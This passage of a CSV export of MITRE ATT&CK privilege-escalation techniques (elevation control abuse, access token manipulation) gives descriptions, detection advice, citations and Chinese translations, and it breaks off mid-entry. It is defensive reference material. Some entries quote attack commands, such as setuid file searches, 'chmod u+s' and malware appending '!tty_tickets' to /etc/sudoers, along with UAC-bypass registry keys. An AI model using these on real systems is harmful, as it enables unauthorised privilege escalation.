ID,name,description,url,created,last modified,version,tactics,detection,platforms,data sources,is sub-technique,sub-technique of,defenses bypassed,contributors,permissions required,supports remote,system requirements,CAPEC ID,impact type,effective permissions,relationship citations,name_zh,description_zh
T1548,Abuse Elevation Control Mechanism,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.,https://attack.mitre.org/techniques/T1548,30 January 2020,21 March 2022,1.0,"Defense Evasion, Privilege Escalation","Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).

Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.

On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.

There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.","Linux, Windows, macOS","Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification",False,,,,"Administrator, User",,,,,,",(Citation: Github UACMe)",滥用权限提升控制机制,攻击者可能会绕过旨在控制提升权限以获得更高级别权限的机制。大多数现代系统都包含本机提升控制机制，旨在限制用户可以在机器上执行的权限。必须将授权授予特定用户才能执行可能被认为具有较高风险的任务。攻击者可以执行多种方法来利用内置控制机制来提升系统的权限。
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",https://attack.mitre.org/techniques/T1548/002,30 January 2020,19 April 2022,2.0,"Defense Evasion, Privilege Escalation","There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.

Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)

* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)

Analysts should monitor these Registry settings for unauthorized changes.",Windows,"Command: Command Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification",True,T1548,Windows User Account Control,Casey Smith; Stefan Kanthak,"Administrator, User",,,,,Administrator,"(Citation: ESET Gelsemium June 2021),(Citation: Rancor Unit42 June 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: Medium KONNI Jan 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Github PowerShell Empire),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Secure List Bad Rabbit),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Cybereason Bumblebee August 2022),(Citation: ESET RTM Feb 2017),(Citation: Fortinet Remcos Feb 2017),(Citation: ESET Sednit Part 3),(Citation: GitHub Pupy),(Citation: ESET PipeMon May 2020),(Citation: Trend Micro Tick November 2019),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: FinFisher Citation),(Citation: ESET InvisiMole June 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Arxiv Avaddon Feb 2021),(Citation: ESET InvisiMole June 2018),(Citation: Cybereason Kimsuky November 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: CISA AppleJeus Feb 2021),(Citation: ClearSky MuddyWater Nov 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Novetta Winnti April 2015),(Citation: Dell Sakula),(Citation: cobaltstrike manual),(Citation: Github Koadic),(Citation: Cymmetria Patchwork),(Citation: Securelist ScarCruft May 2019),(Citation: F-Secure BlackEnergy 2014),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: ESET EvilNum July 2020),(Citation: Talos Lokibot Jan 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: GitHub PoshC2),(Citation: Github UACMe),(Citation: Trend Micro DRBControl February 2020),(Citation: McAfee Honeybee),(Citation: ESET Grandoreiro April 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Cisco H1N1 Part 2),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Forcepoint Monsoon),(Citation: Mandiant No Easy Breach),(Citation: Malwarebytes Konni Aug 2021),(Citation: Eset Ramsay May 2020),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Microsoft FinFisher March 2018),(Citation: Github UACMe)",滥用权限提升控制机制：绕过用户帐户控制,攻击者可能会绕过 UAC 机制来提升系统上的进程权限。 Windows 用户帐户控制 (UAC) 允许程序提升其权限（跟踪为从低到高的完整性级别）以在管理员级别权限下执行任务，可能通过提示用户确认。对用户的影响范围从拒绝高强制执行的操作到允许用户在本地管理员组中执行操作并单击提示或允许他们输入管理员密码以完成操作。（引用： TechNet UAC 工作原理）如果计算机的 UAC 保护级别设置为最高级别以外的任何级别，某些 Windows 程序可以提升权限或执行某些提升的 [组件对象模型](https://attack.mitre.org/techniques/ T1559/001) 对象而不通过 UAC 通知框提示用户。（引用：TechNet Inside UAC）（引用：MSDN COM Elevation）这方面的一个例子是使用 [Rundll32]（https://attack.mitre.org/技术/T1218/011) 加载一个专门设计的 DLL，该 DLL 加载一个自动提升的 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) 对象并在受保护的目录中执行文件操作这通常需要提升访问权限。恶意软件也可能被注入到受信任的进程中，以在不提示用户的情况下获得提升的权限。（引用：戴维森 Windows）已发现许多绕过 UAC 的方法。 UACME 的 Github 自述页面包含已发现和实现的方法的广泛列表（引用：Github UACMe），但可能不是绕过的完整列表。其他绕过方法经常被发现并且有些在野外使用，例如： * <code>eventvwr.exe</code> 可以自动提升和执行指定的二进制文件或脚本。（引用：enigma0x3 Fileless UAC Bypass）（引用： Fortinet Fareit）如果知道具有管理员权限的帐户的凭据，则可以通过一些横向移动技术进行另一种绕过，因为 UAC 是单一系统安全机制，并且在远程系统上运行在一个系统上的进程的权限或完整性将是未知的并默认为高完整性。（引用：SANS UAC Bypass）
T1548.004,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. 

Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",https://attack.mitre.org/techniques/T1548/004,30 January 2020,19 October 2022,1.0,"Defense Evasion, Privilege Escalation",Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.,macOS,"Process: OS API Execution, Process: Process Creation",True,T1548,,"Erika Noerenberg, @gutterchurl, Carbon Black; Jimmy Astle, @AstleJimmy, Carbon Black","Administrator, User",,,,,root,"(Citation: Carbon Black Shlayer Feb 2019),",滥用权限提升控制机制：提升执行与提示,攻击者可以利用 <code>AuthorizationExecuteWithPrivileges</code> API 通过提示用户提供凭据来提升权限。（引用：AppleDocs AuthorizationExecuteWithPrivileges）此 API 的目的是为应用程序开发人员提供一种使用 root 权限执行操作的简单方法，例如至于应用程序安装或更新。此 API 不会验证请求 root 权限的程序是否来自信誉良好的来源或已被恶意修改。尽管此 API 已被弃用，但它在最新版本的 macOS 中仍可完全发挥作用。调用此 API 时，将提示用户输入其凭据，但不会检查程序的来源或完整性。调用 API 的程序还可以加载全局可写文件，这些文件可以被修改以使用提升的权限执行恶意行为。攻击者可能会滥用 <code>AuthorizationExecuteWithPrivileges</code> 来获取 root 权限，以便在受害者身上安装恶意软件并安装持久性机制。（引用：1000 名安装程序的死亡；一切都被破坏了！）（引用：Carbon Black Shlayer 2019 年 2 月） （引用：OSX Coldroot RAT）该技术可能与 [伪装]（https://attack.mitre.org/techniques/T1036）结合使用，以诱骗用户向恶意代码授予升级权限。（引用：1000 个安装程序的死亡; 这一切都坏了！）（引用：Carbon Black Shlayer 2019 年 2 月）通过修改机器上存在的使用此 API 的合法程序，这种技术也被证明是有效的。（引用：1000 名安装人员的死亡；这一切都坏了！ )
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgit bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.

Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",https://attack.mitre.org/techniques/T1548/001,30 January 2020,19 April 2022,1.1,"Defense Evasion, Privilege Escalation","Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","Linux, macOS","Command: Command Execution, File: File Metadata, File: File Modification",True,T1548,,,User,,,,,,"(Citation: ANSSI Sandworm January 2021),(Citation: OSX Keydnap malware),",滥用权限提升控制机制：Setuid 和 Setgid,攻击者可能会滥用应用程序设置了 setuid 或 setgid 位的配置，以便让代码在不同（可能更有特权）用户的上下文中运行。在 Linux 或 macOS 上，当为应用程序二进制设置 setuid 或 setgid 位时，应用程序将分别以拥有用户或组的权限运行。（引用：setuid 手册页）通常应用程序在当前用户的上下文中运行，无论哪个用户或组拥有该应用程序。但是，在某些情况下，程序需要在提升的上下文中执行才能正常运行，但运行它们的用户可能没有特定的所需权限。无需在 sudoers 文件中创建条目（必须由 root 完成），任何用户都可以为自己的应用程序指定要设置的 setuid 或 setgid 标志（即 [Linux 和 Mac 文件和目录权限修改]（https:// attack.mitre.org/techniques/T1222/002))。 <code>chmod</code> 命令可以使用位掩码 <code>chmod 4777 [file]</code> 或通过简写命名 <code>chmod u+s [file]</code> 设置这些位。这将启用 setuid 位。要启用 setgit 位，可以使用 <code>chmod 2775</code> 和 <code>chmod g+s</code>。攻击者可以在他们自己的恶意软件上使用这种机制，以确保他们将来能够在提升的上下文中执行。（引用：OSX Keydnap 恶意软件）这种滥用通常是“shell 逃逸”或其他绕过执行的操作的一部分权限受限的环境。或者，攻击者可以选择查找和定位已启用 setuid 或 setgid 位的易受攻击的二进制文件（即[文件和目录发现]（https://attack.mitre.org/techniques/T1083））。通过 <code>ls -l</code> 查看文件的属性时，setuid 和 setguid 位用“s”而不是“x”表示。 <code>find</code> 命令也可用于搜索此类文件。例如，<code>find / -perm +4000 2>/dev/null</code> 可用于查找设置了 setuid 的文件，<code>find / -perm +2000 2>/dev/null</code > 可用于 setgid。设置了这些位的二进制文件可能会被对手滥用。（引用：GTFOBins Suid）
T1548.003,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",https://attack.mitre.org/techniques/T1548/003,30 January 2020,14 March 2022,1.0,"Defense Evasion, Privilege Escalation","On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.","Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Metadata",True,T1548,,,User,,,,,root,"(Citation: objsee mac malware 2017),(Citation: hexed osx.dok analysis 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),",滥用权限提升控制机制：Sudo 和 Sudo 缓存,攻击者可能会执行 sudo 缓存和/或使用 sudoers 文件来提升权限。攻击者可能会这样做以作为其他用户执行命令或生成具有更高权限的进程。在 Linux 和 MacOS 系统中，sudo（有时称为“超级用户执行”）允许用户从具有提升权限的终端执行命令，并控制谁可以在系统上执行这些命令。 <code>sudo</code> 命令“允许系统管理员授予某些用户（或用户组）以 root 或其他用户身份运行某些（或全部）命令的能力，同时提供对命令及其参数。”（引用：2018 年 sudo 手册页）由于 sudo 是为系统管理员制作的，因此它具有一些有用的配置功能，例如 <code>timestamp_timeout</code>，即时间间隔（以分钟为单位） <code>sudo</code> 的实例，然后它会重新提示输入密码。这是因为 <code>sudo</code> 能够将凭据缓存一段时间。 Sudo 在 <code>/var/db/sudo</code> 处创建（或接触）一个文件，其中包含上次运行 sudo 的时间戳以确定此超时。此外，还有一个 <code>tty_tickets</code> 变量可以单独处理每个新的 tty（终端会话）。这意味着，例如，一个 tty 的 sudo 超时不会影响另一个 tty（您必须再次输入密码）。 sudoers 文件 <code>/etc/sudoers</code> 描述了哪些用户可以运行哪些命令以及从哪些终端。这还描述了用户可以作为其他用户或组运行的命令。这提供了最小权限原则，这样用户大部分时间都在尽可能低的权限下运行，并且仅根据需要提升到其他用户或权限，通常通过提示输入密码。但是，sudoers 文件还可以指定何时不提示用户输入密码，如 <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) 需要提升权限才能编辑虽然这个文件。攻击者还可以滥用这些机制的不良配置来提升权限，而无需用户密码。例如，可以监控 <code>/var/db/sudo</code> 的时间戳以查看它是否在 <code>timestamp_timeout</code> 范围内。如果是这样，则恶意软件可以执行 sudo 命令，而无需提供用户密码。此外，如果 <code>tty_tickets</code> 被禁用，攻击者可以从该用户的任何 tty 执行此操作。在野外，恶意软件已禁用 <code>tty_tickets</code> 以通过发出 <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code> 来潜在地简化脚本编写。（引用：cybereason osx proton ) 为了反映这一变化，恶意软件还发布了<code>killall Terminal</code>。从 macOS Sierra 开始，sudoers 文件默认启用 <code>tty_tickets</code>。
T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",https://attack.mitre.org/techniques/T1134,14 December 2017,03 May 2022,2.0,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. 

There are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.

Query systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)

Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.",Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, User Account: User Account Metadata",False,,"Heuristic Detection, Host Forensic Analysis, System Access Controls, Windows User Account Control","Jared Atkinson, @jaredcatkinson; Robby Winchester, @robwinchester3; Tom Ueltschi @c_APT_ure; Travis Smith, Tripwire","Administrator, User",,,CAPEC-633,,SYSTEM,"(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: FireEye FIN6 Apr 2019),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: McAfee Cuba April 2021),(Citation: Github PowerShell Empire),(Citation: RedCanary Mockingbird May 2020),(Citation: Trend Micro KillDisk 2),(Citation: GitHub Sliver C2),(Citation: GitHub PowerSploit May 2012),(Citation: IBM MegaCortex),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: GitHub PoshC2),(Citation: PowerSploit Documentation),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Kaspersky Duqu 2.0),(Citation: Baumgartner Naikon 2015),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token),(Citation: Microsoft runas)",篡改访问令牌,攻击者可能会修改访问令牌以在不同的用户或系统安全上下文下运行，以执行操作并绕过访问控制。 Windows 使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来好像它是不同进程的子进程或属于启动进程的用户以外的其他人。发生这种情况时，该过程还采用与新令牌关联的安全上下文。攻击者可以使用内置的 Windows API 函数从现有进程中复制访问令牌；这被称为令牌窃取。然后可以将这些令牌应用于现有进程（即 [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)）或用于生成新进程（即 [使用令牌创建进程]（https://attack.mitre.org/techniques/T1134/002））。攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。但是，攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到 SYSTEM 级别。如果帐户在远程系统上具有适当的权限，则攻击者可以使用令牌作为该令牌的帐户向远程系统进行身份验证。（引用：Pentestlab 令牌操作）任何标准用户都可以使用 <code>runas</code > 命令和 Windows API 函数，用于创建模拟令牌；它不需要访问管理员帐户。还有其他机制，例如 Active Directory 字段，可用于修改访问令牌。
T1134.002,Access Token Manipulation: Create Process with Token,"Adversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003)).",https://attack.mitre.org/techniques/T1134/002,18 February 2020,17 October 2021,1.1,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Vadim Khrykov,,,,,,,"(Citation: Unit42 Azorult Nov 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: Talos ZxShell Oct 2014),(Citation: Medium KONNI Jan 2020),(Citation: Secureworks REvil September 2019),(Citation: CheckPoint Naikon May 2020),(Citation: Novetta Blockbuster),(Citation: ESET Turla PowerShell May 2019),(Citation: Novetta Blockbuster Tools),(Citation: McAfee Bankshot),(Citation: Github PowerShell Empire),(Citation: Malwarebytes Konni Aug 2021),(Citation: GitHub PoshC2),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token),(Citation: Microsoft runas)",篡改访问令牌：使用令牌创建进程,攻击者可能会使用不同的令牌创建一个新进程来提升权限并绕过访问控制。可以使用 <code>CreateProcessWithTokenW</code> 和 <code>runas</code> 等功能使用令牌和生成的另一个用户的安全上下文创建进程。（引用：Microsoft RunAs）使用不同的令牌创建进程可能需要目标用户的凭据、模拟该用户的特定权限或对要使用的令牌的访问权限（例如：通过其他方式收集，例如 [Token Impersonation/Theft](https://attack.mitre.org/techniques/ T1134/001) 或 [制作和模拟令牌](https://attack.mitre.org/techniques/T1134/003))。
T1134.003,Access Token Manipulation: Make and Impersonate Token,"Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the <code>LogonUser</code> function. The function will return a copy of the new session's access token and the adversary can use <code>SetThreadToken</code> to assign the token to a thread.",https://attack.mitre.org/techniques/T1134/003,18 February 2020,18 February 2020,1.0,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",,"Administrator, User",,,,,SYSTEM,"(Citation: cobaltstrike manual),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token),(Citation: Microsoft runas)",篡改访问令牌：制作和模拟令牌,攻击者可能会制作和冒充令牌以提升权限并绕过访问控制。如果攻击者有用户名和密码，但用户没有登录系统，攻击者可以使用 <code>LogonUser</code> 函数为用户创建登录会话。该函数将返回新会话的访问令牌的副本，攻击者可以使用 <code>SetThreadToken</code> 将令牌分配给线程。
T1134.004,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

